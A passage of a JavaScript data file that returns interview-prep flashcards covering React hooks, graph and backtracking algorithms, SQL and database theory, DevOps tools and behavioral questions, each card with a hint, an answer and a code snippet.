          code: "import React from 'react';\n\n// Component only re-renders if 'text' prop changes\nconst Button = React.memo(({ text, onClick }) => {\n  console.log('Button rendered');\n  return <button onClick={onClick}>{text}</button>;\n});\n\nexport default Button;",
          category: "React",
          language: "javascript"
        },
        {
          id: "lf-p16-3",
          q: "What is `useMemo`?",
          hint: "Caches the result of an expensive calculation.",
          answer: "A hook that memoizes the RESULT of an expensive function so it is only re-calculated when its dependencies change.",
          code: "import { useMemo } from 'react';\n\nfunction Component({ items }) {\n  // Only recalculate if 'items' array changes reference\n  const totalValue = useMemo(() => {\n    console.log('Calculating total...');\n    return items.reduce((sum, item) => sum + item.value, 0);\n  }, [items]);\n\n  return <div>Total: {totalValue}</div>;\n}",
          category: "React",
          language: "javascript"
        },
        {
          id: "lf-p16-4",
          q: "What is `useCallback`?",
          hint: "Caches a function definition.",
          answer: "A hook that returns a memoized VERSION of a function, useful for passing stable callbacks to optimized child components to prevent unnecessary re-renders.",
          code: "import { useCallback, useState } from 'react';\nimport MemoizedChild from './Child';\n\nfunction Parent() {\n  const [count, setCount] = useState(0);\n\n  // Function reference stays the same across re-renders\n  const handleClick = useCallback(() => {\n    console.log('Clicked');\n  }, []); // Empty deps: function never changes\n\n  return (\n    <div>\n      <button onClick={() => setCount(c => c + 1)}>Count: {count}</button>\n      <MemoizedChild onClick={handleClick} />\n    </div>\n  );\n}",
          category: "React",
          language: "javascript"
        },
        {
          id: "lf-p16-5",
          q: "When should you NOT use `useMemo` or `useCallback`?",
          hint: "When the overhead costs more than the render.",
          answer: "Don't use them prematurely. The hooks themselves carry memory and performance overhead. Only use them for expensive computations or when passing props to heavily memoized children.",
          code: "// BAD: Unnecessary useMemo for a trivial calculation\nconst value = useMemo(() => a + b, [a, b]);\n\n// GOOD: Just calculate it directly\nconst value2 = a + b;\n\n// BAD: useCallback on a button that isn't React.memo()\n// The button re-renders anyway when Parent renders!\nconst log = useCallback(() => console.log(a), [a]);\nreturn <button onClick={log}>Click</button>;",
          category: "React",
          language: "javascript"
        },
        {
          id: "lf-p16-6",
          q: "What is the Virtual DOM?",
          hint: "A lightweight JS copy of the real DOM.",
          answer: "An in-memory representation of the actual DOM. React updates the Virtual DOM first, compares it with the previous version (Diffing), and then selectively updates only the changed nodes in the real DOM (Reconciliation).",
          code: "// Conceptual:\n// 1. State changes: setCount(1)\n// 2. React creates a new Virtual DOM tree.\n// 3. React compares New V-DOM vs Old V-DOM.\n// 4. React finds exactly what changed (e.g., text node '0' to '1').\n// 5. React updates ONLY that text node in the real browser DOM.",
          category: "React",
          language: "javascript"
        },
        {
          id: "lf-p16-7",
          q: "Why do we need 'keys' in React Lists?",
          hint: "Helps React identify which items changed.",
          answer: "Keys help React's reconciliation process identify which items have changed, been added, or been removed. Using index as a key can cause bugs if the list order changes.",
          code: "// Good: Using a unique ID\n{todos.map(todo => (\n  <li key={todo.id}>{todo.text}</li>\n))}\n\n// Bad: Using index (causes bugs if items are deleted/reordered)\n{todos.map((todo, index) => (\n  <li key={index}>{todo.text}</li>\n))}",
          category: "React",
          language: "javascript"
        },
        {
          id: "lf-p16-8",
          q: "Controlled vs Uncontrolled components?",
          hint: "State driven vs DOM driven.",
          answer: "Controlled components derive their value from React state (e.g., `value={state} onChange={handleChange}`). Uncontrolled components maintain their own state in the DOM (accessed via `useRef()`).",
          code: "// Controlled (React manages state)\nconst [val, setVal] = useState('');\n<input value={val} onChange={e => setVal(e.target.value)} />\n\n// Uncontrolled (DOM manages state)\nconst inputRef = useRef(null);\nconst handleSubmit = () => console.log(inputRef.current.value);\n<input ref={inputRef} />",
          category: "React",
          language: "javascript"
        },
        {
          id: "lf-p16-9",
          q: "What is Prop Drilling?",
          hint: "Passing props through many intermediate components.",
          answer: "The process of passing data from a top-level component down to deeply nested components through multiple intermediaries that don't need the data themselves. Solved by Context API or Redux.",
          code: "// Prop Drilling:\n// App (holds theme)\n//  -> Layout (receives theme, passes to Header)\n//      -> Header (receives theme, passes to Button)\n//          -> Button (finally uses theme)\n\n// Solution: Context API allows Button to read theme directly.",
          category: "React",
          language: "javascript"
        },
        {
          id: "lf-p16-10",
          q: "Clone Graph: Strategy?",
          hint: "DFS/BFS + HashMap to map old nodes to new.",
          answer: "Use a HashMap where keys are original nodes and values are the new clones. Traverse via DFS/BFS. If node is in map, return clone. Else, create clone, put in map, and recursively clone neighbors.",
          code: "function cloneGraph(node, map = new Map()) {\n  if (!node) return null;\n  if (map.has(node)) return map.get(node);\n  \n  const clone = new _Node(node.val);\n  map.set(node, clone);\n  \n  for (const neighbor of node.neighbors) {\n    clone.neighbors.push(cloneGraph(neighbor, map));\n  }\n  return clone;\n}",
          category: "DSA",
          language: "javascript"
        }
      ];
    case 17:
      return [
        {
          id: "lf-p17-1",
          q: "Number of Islands: Strategy?",
          hint: "Grid DFS/BFS.",
          answer: "Iterate through the grid. When you find a '1' (land), increment the island count, then launch a DFS/BFS to mark all connected '1's as '0' (visited) so they aren't counted again.",
          code: "function numIslands(grid) {\n  let count = 0;\n  for (let r = 0; r < grid.length; r++) {\n    for (let c = 0; c < grid[0].length; c++) {\n      if (grid[r][c] === '1') {\n        count++;\n        dfs(grid, r, c);\n      }\n    }\n  }\n  return count;\n}\n\nfunction dfs(grid, r, c) {\n  if (r < 0 || c < 0 || r >= grid.length || c >= grid[0].length || grid[r][c] === '0') return;\n  grid[r][c] = '0'; // Sink island\n  dfs(grid, r-1, c); dfs(grid, r+1, c); dfs(grid, r, c-1); dfs(grid, r, c+1);\n}",
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p17-2",
          q: "Course Schedule: Strategy?",
          hint: "Topological Sort / Detect cycle in directed graph.",
          answer: "Build an adjacency list and an in-degree array. Use Kahn's Algorithm (BFS): push nodes with 0 in-degree to a queue. Pop, process neighbors by reducing their in-degree. If reduced to 0, push to queue. If processed nodes == total courses, return true.",
          code: "function canFinish(numCourses, prerequisites) {\n  const adj = Array.from({length: numCourses}, () => []);\n  const inDegree = Array(numCourses).fill(0);\n  for (const [course, prereq] of prerequisites) {\n    adj[prereq].push(course);\n    inDegree[course]++;\n  }\n  const queue = [];\n  for (let i = 0; i < numCourses; i++) {\n    if (inDegree[i] === 0) queue.push(i);\n  }\n  let count = 0;\n  while (queue.length) {\n    const curr = queue.shift();\n    count++;\n    for (const neighbor of adj[curr]) {\n      inDegree[neighbor]--;\n      if (inDegree[neighbor] === 0) queue.push(neighbor);\n    }\n  }\n  return count === numCourses;\n}",
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p17-3",
          q: "Graph representations: Adjacency Matrix vs List?",
          hint: "Dense vs Sparse graphs.",
          answer: "Matrix: 2D array, fast O(1) edge lookup, takes O(V²) space. List: Array of lists, slower edge lookup, takes O(V+E) space. List is preferred for sparse graphs (few edges).",
          code: "// Adjacency Matrix (0 and 1 connected)\nconst matrix = [\n  [0, 1], \n  [1, 0]\n];\n\n// Adjacency List (0 is connected to 1; 1 is connected to 0)\nconst list = [\n  [1], \n  [0]\n];",
          category: "Theory",
          language: "javascript"
        },
        {
          id: "lf-p17-4",
          q: "What is a Trie (Prefix Tree)?",
          hint: "Tree optimized for string prefixes.",
          answer: "A tree data structure used to efficiently store and retrieve keys in a dataset of strings. Highly optimized for prefix searches (e.g., autocomplete, spell checker).",
          code: "class TrieNode {\n  constructor() {\n    this.children = {};\n    this.isEndOfWord = false;\n  }\n}\n// Insert 'cat':\n// root -> 'c' (node) -> 'a' (node) -> 't' (node, isEndOfWord=true)",
          category: "Theory",
          language: "javascript"
        },
        {
          id: "lf-p17-5",
          q: "Implement Trie (Prefix Tree): Insert and Search?",
          hint: "Traverse characters, create nodes if missing.",
          answer: "Insert: Iterate chars, create child nodes if they don't exist. Mark last node `isEnd`. Search: Iterate chars, return false if child doesn't exist. Return `isEnd` at the end.",
          code: "class Trie {\n  constructor() { this.root = {}; }\n  insert(word) {\n    let node = this.root;\n    for (const char of word) {\n      if (!node[char]) node[char] = {};\n      node = node[char];\n    }\n    node.isEnd = true;\n  }\n  search(word) {\n    let node = this.root;\n    for (const char of word) {\n      if (!node[char]) return false;\n      node = node[char];\n    }\n    return !!node.isEnd;\n  }\n}",
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p17-6",
          q: "What is the primary difference between SQL and NoSQL?",
          hint: "Relational/Schema vs Document/Flexible.",
          answer: "SQL is relational, uses tables, enforces strict schemas, and scales vertically. NoSQL is non-relational (documents, key-value), flexible schemas, and designed to scale horizontally.",
          code: "// SQL (Strict Schema, Rows/Cols):\n// CREATE TABLE Users (id INT, name VARCHAR);\n// INSERT INTO Users VALUES (1, 'Alice');\n\n// NoSQL / MongoDB (Flexible JSON Documents):\n// db.users.insert({ _id: 1, name: 'Alice', age: 25, tags: ['dev'] });",
          category: "Database Theory",
          language: "javascript"
        },
        {
          id: "lf-p17-7",
          q: "What is ACID in databases?",
          hint: "Transactions properties.",
          answer: "Properties ensuring reliable database transactions. Atomicity (all or nothing), Consistency (valid state), Isolation (concurrent safe), Durability (saved permanently).",
          code: "// Atomicity example: Bank Transfer\n// BEGIN TRANSACTION;\n// UPDATE checking SET balance = balance - 100;\n// UPDATE savings SET balance = balance + 100;\n// COMMIT;\n// If the server crashes between the two updates, the entire transaction rolls back.",
          category: "Database Theory",
          language: "javascript"
        },
        {
          id: "lf-p17-8",
          q: "What is Database Normalization?",
          hint: "Reducing redundancy.",
          answer: "The process of structuring a relational database to reduce data redundancy and improve data integrity by dividing larger tables into smaller ones and linking them using relationships.",
          code: "// Unnormalized (Redundant):\n// Orders Table: [OrderID, Item, CustomerName, CustomerAddress]\n// If Alice orders 5 times, her address is saved 5 times.\n\n// Normalized:\n// Customers Table: [CustomerID, Name, Address]\n// Orders Table: [OrderID, Item, CustomerID] (Foreign Key)",
          category: "Database Theory",
          language: "javascript"
        },
        {
          id: "lf-p17-9",
          q: "SQL Left Join vs Inner Join?",
          hint: "All left rows vs only matching rows.",
          answer: "Inner Join returns only rows where there is a match in BOTH tables. Left Join returns ALL rows from the left table, and matched rows from the right (or NULL if no match).",
          code: "// INNER JOIN: Only users who HAVE orders are returned.\n// SELECT Users.name, Orders.date FROM Users \n// INNER JOIN Orders ON Users.id = Orders.user_id;\n\n// LEFT JOIN: ALL users are returned. If they have no orders, date is NULL.\n// SELECT Users.name, Orders.date FROM Users \n// LEFT JOIN Orders ON Users.id = Orders.user_id;",
          category: "Database Theory",
          language: "javascript"
        },
        {
          id: "lf-p17-10",
          q: "What are Database Indexes?",
          hint: "Book index for faster reads.",
          answer: "Data structures that improve the speed of data retrieval operations on a database table at the cost of additional storage space and slower writes (INSERT/UPDATE).",
          code: "// If searching for a user by email is slow:\n// SELECT * FROM Users WHERE email = 'test@test.com'; (Linear Scan O(n))\n\n// Create an index:\n// CREATE INDEX idx_email ON Users(email);\n\n// Now the DB uses a B-Tree to find the email in O(log n) time.",
          category: "Database Theory",
          language: "javascript"
        }
      ];
    case 18:
      return [
        {
          id: "lf-p18-1",
          q: "Word Search: Strategy?",
          hint: "Backtracking (DFS).",
          answer: "Iterate through the grid. If a cell matches the first letter, start a DFS. In DFS, temporarily mark the cell as visited (e.g., change to '#'), recurse in 4 directions, then unmark it (backtrack).",
          code: "function exist(board, word) {\n  for (let r = 0; r < board.length; r++) {\n    for (let c = 0; c < board[0].length; c++) {\n      if (dfs(board, r, c, 0, word)) return true;\n    }\n  }\n  return false;\n}\n\nfunction dfs(board, r, c, i, word) {\n  if (i === word.length) return true;\n  if (r < 0 || c < 0 || r >= board.length || c >= board[0].length || board[r][c] !== word[i]) return false;\n  \n  const temp = board[r][c];\n  board[r][c] = '#'; // Mark visited\n  const found = dfs(board, r+1, c, i+1, word) || dfs(board, r-1, c, i+1, word) || \n                dfs(board, r, c+1, i+1, word) || dfs(board, r, c-1, i+1, word);\n  board[r][c] = temp; // Backtrack\n  return found;\n}",
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p18-2",
          q: "Permutations: Strategy?",
          hint: "Backtracking with a visited array or filtering.",
          answer: "Use backtracking. Build an array by adding unused numbers. When the built array length equals the input length, add a copy to results. Loop through choices, pick one, recurse, backtrack.",
          code: "function permute(nums) {\n  const res = [];\n  function backtrack(path, used) {\n    if (path.length === nums.length) {\n      res.push([...path]);\n      return;\n    }\n    for (let i = 0; i < nums.length; i++) {\n      if (used[i]) continue;\n      used[i] = true;\n      path.push(nums[i]);\n      backtrack(path, used);\n      path.pop(); // Backtrack\n      used[i] = false; // Backtrack\n    }\n  }\n  backtrack([], []);\n  return res;\n}",
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p18-3",
          q: "Subsets: Strategy?",
          hint: "Include or Exclude element.",
          answer: "Backtracking. At each element, make two recursive calls: one where you INCLUDE the element in the current subset, and one where you EXCLUDE it.",
          code: "function subsets(nums) {\n  const res = [];\n  function backtrack(index, current) {\n    if (index === nums.length) {\n      res.push([...current]);\n      return;\n    }\n    // Option 1: Include\n    current.push(nums[index]);\n    backtrack(index + 1, current);\n    current.pop(); // Backtrack\n    \n    // Option 2: Exclude\n    backtrack(index + 1, current);\n  }\n  backtrack(0, []);\n  return res;\n}",
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p18-4",
          q: "Combination Sum: Strategy?",
          hint: "Backtrack, allow reusing same index.",
          answer: "Backtrack. Keep track of current sum. If sum == target, record. If sum > target, return. Recurse by looping from current index (to allow reusing the same coin) up to end.",
          code: "function combinationSum(candidates, target) {\n  const res = [];\n  function backtrack(index, currentPath, currentSum) {\n    if (currentSum === target) return res.push([...currentPath]);\n    if (currentSum > target) return;\n    \n    for (let i = index; i < candidates.length; i++) {\n      currentPath.push(candidates[i]);\n      // Pass 'i' not 'i+1' because we can reuse elements\n      backtrack(i, currentPath, currentSum + candidates[i]);\n      currentPath.pop(); // Backtrack\n    }\n  }\n  backtrack(0, [], 0);\n  return res;\n}",
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p18-5",
          q: "What is Backtracking?",
          hint: "Build solution incrementally, abandon if invalid.",
          answer: "An algorithmic technique for finding all (or some) solutions by building them incrementally, and abandoning a path ('backtracking') as soon as it determines the path cannot lead to a valid solution.",
          code: "// General Template:\nfunction backtrack(state) {\n  if (isGoal(state)) return addSolution(state);\n  \n  for (const choice of getChoices(state)) {\n    if (isValid(choice)) {\n      makeChoice(state, choice);\n      backtrack(state);\n      undoChoice(state, choice); // THIS is the backtrack step\n    }\n  }\n}",
          category: "Theory",
          language: "javascript"
        },
        {
          id: "lf-p18-6",
          q: "What does `Array.prototype.flat()` do?",
          hint: "Flattens nested arrays.",
          answer: "Creates a new array with all sub-array elements concatenated into it recursively up to the specified depth (default 1).",
          code: "const arr = [1, 2, [3, 4, [5, 6]]];\n\nconsole.log(arr.flat());        // [1, 2, 3, 4, [5, 6]] (depth 1)\nconsole.log(arr.flat(2));       // [1, 2, 3, 4, 5, 6]   (depth 2)\nconsole.log(arr.flat(Infinity)); // Flattens completely regardless of depth",
          category: "JS Theory",
          language: "javascript"
        },
        {
          id: "lf-p18-7",
          q: "Difference between `==` and `===`?",
          hint: "Type coercion.",
          answer: "`==` compares values after attempting type coercion (converting them to the same type). `===` strictly compares both value AND type. Always use `===`.",
          code: "console.log(5 == '5');  // true (string '5' coerced to number)\nconsole.log(5 === '5'); // false (different types)\n\nconsole.log(0 == false); // true\nconsole.log(0 === false); // false\n\nconsole.log(null == undefined); // true\nconsole.log(null === undefined); // false",
          category: "JS Theory",
          language: "javascript"
        },
        {
          id: "lf-p18-8",
          q: "What is a Symbol in JavaScript?",
          hint: "Unique and immutable primitive.",
          answer: "A primitive data type introduced in ES6. Every Symbol is unique. Often used to add hidden, non-enumerable properties to objects to prevent naming collisions.",
          code: "const sym1 = Symbol('id');\nconst sym2 = Symbol('id');\nconsole.log(sym1 === sym2); // false (always unique)\n\nconst obj = {};\nobj[sym1] = 'hidden value';\n\n// Not visible in normal iteration:\nconsole.log(Object.keys(obj)); // []\n// Accessible directly if you have the symbol reference:\nconsole.log(obj[sym1]); // 'hidden value'",
          category: "JS Theory",
          language: "javascript"
        },
        {
          id: "lf-p18-9",
          q: "What are Generator functions?",
          hint: "Functions that can be paused and resumed (`yield`).",
          answer: "Functions written with `function*` that can be paused mid-execution and resumed later. They use `yield` to return multiple values one at a time via an Iterator.",
          code: "function* idMaker() {\n  let id = 1;\n  while (id <= 3) {\n    yield id++;\n  }\n}\n\nconst gen = idMaker();\nconsole.log(gen.next().value); // 1\nconsole.log(gen.next().value); // 2\nconsole.log(gen.next().value); // 3\nconsole.log(gen.next().done);  // true",
          category: "JS Theory",
          language: "javascript"
        },
        {
          id: "lf-p18-10",
          q: "How does `this` behave in a regular function vs arrow function in a class?",
          hint: "Dynamic vs Lexical.",
          answer: "In a class method, regular functions lose `this` if passed as callbacks (unless bound). Arrow functions lexically bind `this` to the class instance.",
          code: "class Button {\n  constructor() { this.name = 'Btn'; }\n  \n  regularClick() { console.log(this.name); }\n  arrowClick = () => { console.log(this.name); }\n}\n\nconst btn = new Button();\nconst reg = btn.regularClick;\nconst arr = btn.arrowClick;\n\n// reg(); // TypeError: Cannot read property 'name' of undefined\narr(); // 'Btn' (this is preserved)",
          category: "JS Theory",
          language: "javascript"
        }
      ];
    case 19:
      return [
        {
          id: "lf-p19-1",
          q: "Merge K Sorted Lists: Strategy?",
          hint: "Min-Heap or Divide and Conquer.",
          answer: "Optimal: Min-Heap (Priority Queue) to always pull the smallest node across all K lists. Alternative (JavaScript friendly): Divide and Conquer, merging lists in pairs until 1 remains.",
          code: "// Divide and Conquer Approach\nfunction mergeKLists(lists) {\n  if (!lists.length) return null;\n  while (lists.length > 1) {\n    const a = lists.shift();\n    const b = lists.shift();\n    const merged = mergeTwoLists(a, b); // (helper from Day 14)\n    lists.push(merged);\n  }\n  return lists[0];\n}",
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p19-2",
          q: "Find Median from Data Stream: Strategy?",
          hint: "Two Heaps (Max-Heap for lower half, Min-Heap for upper).",
          answer: "Maintain two heaps. A Max-Heap for the smaller half of numbers, a Min-Heap for the larger half. Keep their sizes balanced (difference max 1). Median is the root of the larger heap, or average of both roots.",
          code: "// Conceptual logic (JS doesn't have native Heaps)\nclass MedianFinder {\n  // low = MaxHeap, high = MinHeap\n  addNum(num) {\n    this.low.push(num);\n    this.high.push(this.low.popMax());\n    if (this.low.size < this.high.size) {\n      this.low.push(this.high.popMin());\n    }\n  }\n  findMedian() {\n    return this.low.size > this.high.size ? \n           this.low.peek() : \n           (this.low.peek() + this.high.peek()) / 2;\n  }\n}",
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p19-3",
          q: "What is a Heap (Priority Queue)?",
          hint: "Tree-based structure where parent > children.",
          answer: "A complete binary tree where the parent node is greater/smaller than or equal to its children (Max-Heap/Min-Heap). Finding the max/min is O(1), insertions/deletions are O(log n).",
          code: "// Arrays are used to represent heaps implicitly\n// Parent index: Math.floor((index - 1) / 2)\n// Left child index: 2 * index + 1\n// Right child index: 2 * index + 2",
          category: "Theory",
          language: "javascript"
        },
        {
          id: "lf-p19-4",
          q: "Trapping Rain Water: Strategy?",
          hint: "Two Pointers or Left/Right Max Arrays.",
          answer: "Two Pointers: Maintain left_max and right_max. If left_max < right_max, process left pointer (water = left_max - height[left], increment left). Else process right pointer.",
          code: "function trap(height) {\n  let left = 0, right = height.length - 1;\n  let leftMax = 0, rightMax = 0, water = 0;\n  while (left < right) {\n    if (height[left] < height[right]) {\n      height[left] >= leftMax ? leftMax = height[left] : water += leftMax - height[left];\n      left++;\n    } else {\n      height[right] >= rightMax ? rightMax = height[right] : water += rightMax - height[right];\n      right--;\n    }\n  }\n  return water;\n}",
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p19-5",
          q: "Serialize and Deserialize Binary Tree?",
          hint: "BFS/DFS to string, split to array to rebuild.",
          answer: "Serialize: Pre-order traversal, append node value, append 'null' for empty. Deserialize: Split string by commas, use shift() on the array to recursively rebuild the tree.",
          code: "const serialize = (root) => {\n  if (!root) return 'X,';\n  return root.val + ',' + serialize(root.left) + serialize(root.right);\n};\n\nconst deserialize = (data) => {\n  const queue = data.split(',');\n  const buildTree = () => {\n    const val = queue.shift();\n    if (val === 'X') return null;\n    const node = new TreeNode(parseInt(val));\n    node.left = buildTree();\n    node.right = buildTree();\n    return node;\n  };\n  return buildTree();\n};",
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p19-6",
          q: "What is Dependency Injection?",
          hint: "Passing dependencies rather than creating them inside.",
          answer: "A design pattern where an object receives its dependencies from the outside rather than creating them internally. This makes code more testable and decoupled.",
          code: "// Bad: tightly coupled\nclass UserService {\n  constructor() { this.db = new Database(); } // Hardcoded\n}\n\n// Good: Dependency Injection\nclass UserService {\n  constructor(database) { this.db = database; } // Injected\n}\n// Now you can inject a MockDatabase during testing!",
          category: "System Design",
          language: "javascript"
        },
        {
          id: "lf-p19-7",
          q: "What is CI/CD?",
          hint: "Continuous Integration / Continuous Deployment.",
          answer: "CI automatically builds and tests code when pushed to a repo. CD automatically deploys the code to production if tests pass. Reduces bugs and manual deployment errors.",
          code: "// Typical CI/CD Pipeline flow (e.g., GitHub Actions):\n// 1. Developer pushes code to 'main'.\n// 2. Action triggers: runs 'npm install'.\n// 3. Action runs 'npm test' (CI).\n// 4. If green, Action builds Docker image.\n// 5. Action pushes image to AWS/Vercel (CD).",
          category: "DevOps",
          language: "javascript"
        },
        {
          id: "lf-p19-8",
          q: "What is Docker?",
          hint: "Containerization.",
          answer: "A tool that packages an application and its dependencies into a standardized unit called a container. It ensures the app runs identically across different environments ('works on my machine').",
          code: "// Simple Dockerfile for Node app:\n// FROM node:18-alpine\n// WORKDIR /app\n// COPY package.json .\n// RUN npm install\n// COPY . .\n// EXPOSE 3000\n// CMD [\"node\", \"server.js\"]",
          category: "DevOps",
          language: "javascript"
        },
        {
          id: "lf-p19-9",
          q: "Load Balancer: What does it do?",
          hint: "Distributes incoming traffic.",
          answer: "It sits in front of multiple backend servers and distributes incoming client requests across them. It prevents any single server from overloading and provides high availability.",
          code: "// Conceptual:\n// Client -> [ Load Balancer ] -> Server 1 (CPU 80%)\n//                                 -> Server 2 (CPU 20%) <-- Routes here\n//                                 -> Server 3 (Offline) <-- Avoids",
          category: "System Design",
          language: "javascript"
        },
        {
          id: "lf-p19-10",
          q: "Caching Strategies: Redis vs Local Memory?",
          hint: "Distributed vs Single-node.",
          answer: "Local memory (e.g., variables) is fast but doesn't share state across multiple server instances. Distributed caches (e.g., Redis) sit outside the app, allowing all server instances to read/write shared cached data.",
          code: "// Distributed Cache (Redis) workflow:\n// async function getUser(id) {\n//   const cached = await redis.get(`user:${id}`);\n//   if (cached) return JSON.parse(cached); // Fast return\n//   \n//   const user = await db.query(`SELECT * FROM users WHERE id=?`, [id]);\n//   await redis.set(`user:${id}`, JSON.stringify(user)); // Cache for later\n//   return user;\n// }",
          category: "System Design",
          language: "javascript"
        }
      ];
    case 20:
      return [
        {
          id: "lf-p20-1",
          q: "What are the common HTTP methods used in REST APIs?",
          hint: "GET, POST, PUT, DELETE, PATCH.",
          answer: "GET (retrieve data), POST (create new data), PUT (replace data completely), PATCH (update data partially), DELETE (remove data).",
          code: "// Fetch API Examples\n// GET:\nfetch('/api/users');\n// POST:\nfetch('/api/users', { method: 'POST', body: JSON.stringify({name: 'A'}) });\n// PATCH:\nfetch('/api/users/1', { method: 'PATCH', body: JSON.stringify({name: 'B'}) });\n// DELETE:\nfetch('/api/users/1', { method: 'DELETE' });",
          category: "Backend Theory",
          language: "javascript"
        },
        {
          id: "lf-p20-2",
          q: "What is an Index in a Database?",
          hint: "Speeds up data retrieval.",
          answer: "An index is a data structure (like a B-Tree) that improves the speed of data retrieval operations on a database table, at the cost of additional storage and slightly slower writes.",
          code: "-- SQL Example\n-- If searches by email are slow:\nCREATE INDEX idx_users_email ON Users(email);\n-- Now SELECT * FROM Users WHERE email = '...' is much faster (O(log n))",
          category: "Database Theory",
          language: "sql"
        },
        {
          id: "lf-p20-3",
          q: "What is the difference between Authentication and Authorization?",
          hint: "Who you are vs what you can do.",
          answer: "Authentication verifies WHO a user is (e.g., logging in with a password). Authorization determines WHAT the authenticated user is allowed to do (e.g., admin vs regular user permissions).",
          code: "// Conceptual Example\n// Authentication: Validating JWT token\nif (!isValidUser(req.token)) return res.status(401).send('Who are you?');\n\n// Authorization: Checking roles\nif (req.user.role !== 'admin') return res.status(403).send('Not allowed!');",
          category: "Security",
          language: "javascript"
        },
        {
          id: "lf-p20-4",
          q: "What is a Foreign Key?",
          hint: "Links two tables together.",
          answer: "A Foreign Key is a column (or group of columns) in one table that refers to the Primary Key in another table. It enforces referential integrity.",
          code: "-- SQL Example\nCREATE TABLE Orders (\n    OrderID int PRIMARY KEY,\n    OrderNumber int NOT NULL,\n    -- Foreign Key referencing Persons table:\n    PersonID int FOREIGN KEY REFERENCES Persons(PersonID)\n);",
          category: "Database Theory",
          language: "sql"
        },
        {
          id: "lf-p20-5",
          q: "Explain MVC Architecture.",
          hint: "Model, View, Controller.",
          answer: "Model: Manages data and business logic. View: UI components that display data. Controller: Handles user input, interacts with Model, and updates View.",
          code: "// Conceptual Node.js MVC Structure\n// Model (user.model.js) - Database schema and queries\n// Controller (user.controller.js) - Handles request, calls Model\n// View/Route (user.routes.js) - Defines API endpoints (or HTML render)",
          category: "System Design",
          language: "javascript"
        },
        {
          id: "lf-p20-6",
          q: "What is a Promise?",
          hint: "Represents the eventual completion of an async operation.",
          answer: "An object representing the eventual completion (or failure) of an asynchronous operation. It has three states: pending, fulfilled, or rejected.",
          code: "const myPromise = new Promise((resolve, reject) => {\n  setTimeout(() => {\n    const success = true;\n    if (success) resolve('Operation successful');\n    else reject('Operation failed');\n  }, 1000);\n});\n\nmyPromise\n  .then(res => console.log(res))\n  .catch(err => console.error(err));",
          category: "JS Theory",
          language: "javascript"
        },
        {
          id: "lf-p20-7",
          q: "What are React Hooks?",
          hint: "Functions starting with 'use'.",
          answer: "Functions that let you 'hook into' React state and lifecycle features from functional components. Common ones: useState, useEffect, useContext, useRef.",
          code: "import React, { useState, useEffect } from 'react';\n\nfunction Counter() {\n  // useState: add state to function component\n  const [count, setCount] = useState(0);\n\n  // useEffect: handle side effects (like componentDidMount)\n  useEffect(() => {\n    document.title = `Count: ${count}`;\n  }, [count]); // Only re-run if count changes\n\n  return <button onClick={() => setCount(c => c+1)}>{count}</button>;\n}",
          category: "React",
          language: "javascript"
        },
        {
          id: "lf-p20-8",
          q: "What is Redux?",
          hint: "Global state management.",
          answer: "A predictable state container for JavaScript apps. It stores the entire application state in a single central store. Components dispatch 'actions' to 'reducers' to update the state.",
          code: "// Redux Core Concepts:\n// Store: Holds the global state.\n// Action: Plain object describing WHAT happened ({ type: 'INCREMENT' }).\n// Reducer: Pure function that takes current state + action and returns NEW state.\n\nconst reducer = (state = 0, action) => {\n  if (action.type === 'INCREMENT') return state + 1;\n  return state;\n};",
          category: "React Ecosystem",
          language: "javascript"
        },
        {
          id: "lf-p20-9",
          q: "What is Docker Compose?",
          hint: "Run multi-container applications.",
          answer: "A tool for defining and running multi-container Docker applications using a YAML file (docker-compose.yml). It allows starting all services (e.g., app + database) with a single command.",
          code: "# docker-compose.yml example\n# version: '3'\n# services:\n#   web:\n#     build: .\n#     ports: [\"3000:3000\"]\n#   db:\n#     image: postgres\n#     environment:\n#       POSTGRES_PASSWORD: secret\n\n# Command to start both: docker-compose up",
          category: "DevOps",
          language: "yaml"
        },
        {
          id: "lf-p20-10",
          q: "What is Git Rebase?",
          hint: "Moving a branch to a new base commit.",
          answer: "Rebasing takes the commits from one branch and applies them on top of another branch. It creates a cleaner, linear project history compared to git merge.",
          code: "# Standard workflow:\n# git checkout feature-branch\n# git fetch origin\n# git rebase origin/main\n# (Resolve any conflicts)\n# git push --force-with-lease origin feature-branch",
          category: "Tools",
          language: "bash"
        }
      ];
    case 21:
      return [
        {
          id: "lf-p21-1",
          q: "Behavioral: 'Tell me about yourself.'",
          hint: "Present, Past, Future framework.",
          answer: "Keep it professional. Start with your current role/status (Present), highlight key past experiences and achievements that led you here (Past), and explain why you're excited about this specific opportunity (Future).",
          code: "// Mental Outline:\n// Present: 'I am currently a Software Engineer at X focusing on frontend...'\n// Past: 'Previously, I built backend APIs at Y which gave me full-stack perspective...'\n// Future: 'I'm looking to join your team because I love your product and want to scale...'",
          category: "Behavioral",
          language: "javascript"
        },
        {
          id: "lf-p21-2",
          q: "Behavioral: 'Why do you want to work here?'",
          hint: "Show you did your research.",
          answer: "Mention specific details about the company's product, tech stack, culture, or recent news. Connect those details to your own skills and career goals.",
          code: "// Avoid generic answers.\n// Good approach:\n// 1. Mention a specific technical challenge they face that excites you.\n// 2. Mention alignment with their core values or mission.\n// 3. Highlight how your specific background helps solve their problems.",
          category: "Behavioral",
          language: "javascript"
        },
        {
          id: "lf-p21-3",
          q: "Behavioral: 'Tell me about a time you had a conflict with a coworker.'",
          hint: "Focus on resolution and communication.",
          answer: "Use the STAR method (Situation, Task, Action, Result). Choose a professional disagreement (e.g., technical approach). Emphasize how you communicated, compromised, and achieved a positive outcome for the project.",
          code: "// S: 'We disagreed on whether to use Redux or Context API.'\n// T: 'We needed to decide quickly to meet the deadline.'\n// A: 'I proposed a quick meeting, we listed pros/cons. I listened to their concerns about setup time, and agreed Context was better for this MVP.'\n// R: 'We shipped on time and documented when to migrate to Redux later.'",
          category: "Behavioral",
          language: "javascript"
        },
        {
          id: "lf-p21-4",
          q: "Behavioral: 'What is your greatest weakness?'",
          hint: "Real weakness + Action plan.",
